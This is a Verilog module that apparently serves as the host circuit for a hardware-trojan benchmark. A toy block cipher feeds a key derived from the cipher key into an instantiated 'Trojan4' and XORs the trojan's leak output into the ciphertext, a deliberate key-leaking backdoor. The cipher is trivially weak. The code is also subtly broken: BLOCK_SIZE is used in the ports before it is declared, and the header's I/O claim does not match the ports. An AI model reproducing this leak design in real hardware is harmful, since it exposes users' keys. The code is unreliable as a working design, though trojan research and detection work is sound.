// Crypto Host Circuit for Trojan4
// Fixed I/O to match Trojan4: clk, rst, key[63:0] -> leak[63:0]
module trojan4_crypto0_host #(
    parameter [127:0] IV_SEED = 128'h0123456789ABCDEF0123456789ABCDEF  // IV generation seed
)(
    input wire clk,
    input wire rst,
    input wire [BLOCK_SIZE*8-1:0] plaintext,
    input wire [BLOCK_SIZE*8-1:0] cipher_key,
    input wire encrypt_start,
    output reg [BLOCK_SIZE*8-1:0] ciphertext,
    output reg encrypt_done
);

    // Sizing parameters (converted from parameter to localparam)
    localparam ROUND_COUNT = 8;   // Number of encryption rounds
    localparam BLOCK_SIZE = 16;   // Block size in bytes

    // Trojan interface (fixed width)
    wire [63:0] trojan_key;
    wire [63:0] trojan_leak;
    
    // Encryption state
    reg [BLOCK_SIZE*8-1:0] state;
    reg [BLOCK_SIZE*8-1:0] round_key;
    reg [$clog2(ROUND_COUNT)-1:0] round_counter;
    reg encrypting;
    
    // Key generation for trojan
    reg [127:0] iv_gen;
    reg [63:0] derived_key;
    
    // Generate key for trojan from cipher operations
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            iv_gen <= IV_SEED;
            derived_key <= 64'h0;
        end else if (encrypt_start || encrypting) begin
            iv_gen <= {iv_gen[126:0], iv_gen[127] ^ iv_gen[95] ^ iv_gen[63] ^ iv_gen[31]};
            derived_key <= cipher_key[63:0] ^ iv_gen[63:0];
        end
    end
    
    assign trojan_key = derived_key;
    
    // Simple encryption FSM
    // Output with trojan leak integration
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            state <= {(BLOCK_SIZE*8){1'b0}};
            round_key <= {(BLOCK_SIZE*8){1'b0}};
            round_counter <= {$clog2(ROUND_COUNT){1'b0}};
            encrypting <= 1'b0;
            encrypt_done <= 1'b0;
            ciphertext <= {(BLOCK_SIZE*8){1'b0}};
        end else begin
            if (encrypt_start && !encrypting) begin
                state <= plaintext;
                round_key <= cipher_key;
                round_counter <= {$clog2(ROUND_COUNT){1'b0}};
                encrypting <= 1'b1;
                encrypt_done <= 1'b0;
            end else if (encrypting) begin
                // Rotate (ROUND_COUNT-1) times
                if (round_counter == $clog2(ROUND_COUNT)'(ROUND_COUNT-1)) begin
                    encrypting <= 1'b0;
                    encrypt_done <= 1'b1;
                    // Mix ciphertext with trojan leak (only lower 64 bits affected)
                    ciphertext <= state ^ {{(BLOCK_SIZE*8-64){1'b0}}, trojan_leak};
                end else begin
                    // Simple round operation (XOR with rotated key)
                    state <= state ^ round_key;
                    round_key <= {round_key[BLOCK_SIZE*8-9:0], round_key[BLOCK_SIZE*8-1:BLOCK_SIZE*8-8]};
                    round_counter <= round_counter + 1;
                end
            end else begin
                encrypt_done <= 1'b0;
            end
        end
    end
    
    // Instantiate Trojan4
    Trojan4 trojan_inst (
        .clk(clk),
        .rst(rst),
        .key(trojan_key),
        .leak(trojan_leak)
    );

endmodule
